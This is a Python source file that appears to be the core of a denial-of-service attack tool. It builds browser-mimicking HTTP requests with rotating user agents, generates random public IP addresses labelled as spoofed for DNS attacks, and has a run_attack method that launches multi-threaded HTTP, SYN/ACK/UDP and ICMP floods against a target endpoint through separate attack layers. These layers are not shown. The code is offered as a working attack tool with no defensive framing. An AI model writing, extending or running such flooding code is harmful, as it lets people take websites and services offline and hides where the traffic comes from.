from random import choice, randint
from ssl import SSLContext, CERT_NONE, PROTOCOL_TLS_CLIENT, CERT_REQUIRED
from certifi import where
from threading import Thread
from urllib.parse import urlparse
from typing import Optional, Callable

class Endpoint:
    def __init__(self, host: str, port: int = 80, scheme: str = "http", path: str = "/"):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.path = path

def parse_url(url: str) -> Optional[Endpoint]:
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.hostname:
        return None
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    return Endpoint(parsed.hostname, port, parsed.scheme, path)

class NetTools:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15 Version/16.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5) Safari/604.1 Version/16.0",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) Chrome/114.0 Mobile Safari/537.36"
        ]

    def random_user_agent(self) -> str:
        return choice(self.user_agents)

    def base_headers(self, method: str, endpoint: Endpoint) -> str:
        return (
            f"{method.upper()} {endpoint.path} HTTP/{choice(['1.0', '1.1'])}\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
        )

    def build_request(self, endpoint: Endpoint, method: str = "GET", body: str = "") -> bytes:
        _body = ""

        headers = self.base_headers(method, endpoint)
        headers += f"Host: {endpoint.host}\r\n"
        headers += f"User-Agent: {self.random_user_agent()}\r\n"

        if method.upper() == "POST":
            headers += f"Content-Length: {len(body.encode())}\r\n"
            _body = body

        return (headers + "\r\n" + _body).encode()

    def create_ssl_context(self) -> SSLContext:
        ctx = SSLContext(PROTOCOL_TLS_CLIENT)
        ctx.load_verify_locations(cafile=where())
        ctx.check_hostname = True
        ctx.verify_mode = CERT_REQUIRED
        return ctx

    def generate_spoofed_ip(self) -> str:
        while True:
            octets = [randint(1, 223)]
            octets += [randint(0, 255) for _ in range(3)]
            ip = ".".join(map(str, octets))

            private_ranges = [
                ("10.0.0.0", "10.255.255.255"),
                ("127.0.0.0", "127.255.255.255"),
                ("172.16.0.0", "172.31.255.255"),
                ("192.168.0.0", "192.168.255.255"),
                ("224.0.0.0", "239.255.255.255"), 
            ]

            def ip_to_int(ip_str):
                parts = list(map(int, ip_str.split(".")))
                return parts[0]<<24 | parts[1]<<16 | parts[2]<<8 | parts[3]

            ip_int = ip_to_int(ip)
            if any(ip_to_int(start) <= ip_int <= ip_to_int(end) for start, end in private_ranges):
                continue
            return ip
    
    def run_threads(self, func, args=(), count: int = 1):
        for _ in range(count):
            t = Thread(target=func, args=args, daemon=True)
            t.start()

    def run_attack(self, endpoint: Endpoint, duration: int, method: str, threads: int):
        from .layers import L7,L4,L3
        
        def get_function(method: str) -> Callable:
            method = method.upper()
            if method in {"GET", "POST", "PUT", "DELETE", "HEAD", "DNS"}:
                l7 = L7(endpoint, duration=duration)
                return getattr(l7, method)
            elif method in {"ACK", "SYN", "FIN", "RST", "TCP", "UDP"}:
                l4 = L4(endpoint, duration=duration)
                return getattr(l4, method)
            elif method == "ICMP":
                l3 = L3(endpoint, duration=duration)
                return getattr(l3, method)
            else:
                raise ValueError(f"Unsupported attack method: {method}")
        func = get_function(method)
        if method != "DNS":
            args = ()
        else:
            args = (self.generate_spoofed_ip(),)
        self.run_threads(func,args,threads)